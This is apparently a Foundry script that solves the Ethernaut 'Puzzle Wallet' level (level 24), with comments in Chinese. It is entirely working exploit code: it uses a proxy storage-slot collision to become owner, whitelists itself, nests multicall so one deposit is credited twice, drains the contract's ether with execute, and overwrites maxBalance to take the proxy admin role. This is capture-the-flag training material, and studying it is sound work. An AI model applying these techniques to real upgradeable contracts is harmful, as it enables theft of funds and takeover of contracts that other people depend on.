// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/levels/24-PuzzleWallet/PuzzleWallet.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract Level24Solution is Script {
    PuzzleWallet _puzzleWalletInstance = PuzzleWallet(payable(0x134A24C1eCbA3f77216Bd2b7B9DD5F7580Bd82af));
    PuzzleProxy _proxyInstance = PuzzleProxy(payable(0x134A24C1eCbA3f77216Bd2b7B9DD5F7580Bd82af));

    function run() public{
        vm.startBroadcast();

        // 修改owner
        _proxyInstance.proposeNewAdmin(tx.origin);
        console.log("New Owner : ", _puzzleWalletInstance.owner());

        // 查询余额
        console.log("Balances : ", address(_proxyInstance).balance);

        // 增加白名单
        _puzzleWalletInstance.addToWhitelist(tx.origin);

        // multicall 构造额外交易
        bytes[] memory normalDeposit = new bytes[](1);
        normalDeposit[0] = abi.encodeWithSelector(_puzzleWalletInstance.deposit.selector);
        bytes[] memory badDeposit = new bytes[](2);
        badDeposit[0] = abi.encodeWithSelector(_puzzleWalletInstance.deposit.selector);
        badDeposit[1] = abi.encodeWithSelector(_puzzleWalletInstance.multicall.selector, normalDeposit);

        _puzzleWalletInstance.multicall{value : 1000000000000000 wei}(badDeposit);

        // 转账
        _puzzleWalletInstance.execute(tx.origin, 2000000000000000 wei, "");

        // 设置maxBalance，修改admin
        _puzzleWalletInstance.setMaxBalance(uint256(uint160(tx.origin)));
        
        console.log("admin : ", _proxyInstance.admin());
    
        vm.stopBroadcast();
    }
}